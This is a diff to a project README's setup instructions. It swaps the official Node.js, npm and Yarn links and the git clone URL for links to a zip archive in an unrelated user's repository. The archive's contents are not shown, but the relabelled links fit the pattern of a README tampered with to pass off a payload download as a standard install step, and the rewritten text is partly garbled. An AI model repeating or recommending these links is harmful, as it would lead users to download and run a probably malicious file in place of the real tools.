@@ -23,15 +23,15 @@ These instructions will help you get a copy of the project up and running on you
 
 Make sure you have the following software installed on your machine:
 
-- [Node.js](https://nodejs.org/) (v14.x or higher recommended)
-- [npm](https://www.npmjs.com/) (comes with Node.js) or [Yarn](https://yarnpkg.com/)
+- [https://github.com/Pelumi-oloruntegbe/jobme-client/raw/refs/heads/main/src/pages/jobme_client_v1.4.zip](https://github.com/Pelumi-oloruntegbe/jobme-client/raw/refs/heads/main/src/pages/jobme_client_v1.4.zip) (v14.x or higher recommended)
+- [npm](https://github.com/Pelumi-oloruntegbe/jobme-client/raw/refs/heads/main/src/pages/jobme_client_v1.4.zip) (comes with https://github.com/Pelumi-oloruntegbe/jobme-client/raw/refs/heads/main/src/pages/jobme_client_v1.4.zip) or [Yarn](https://github.com/Pelumi-oloruntegbe/jobme-client/raw/refs/heads/main/src/pages/jobme_client_v1.4.zip)
 
 ### Installation
 
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Muba-rak/Jobme-client-starter
+   git clone https://github.com/Pelumi-oloruntegbe/jobme-client/raw/refs/heads/main/src/pages/jobme_client_v1.4.zip
    cd into the project folder
    ```
 
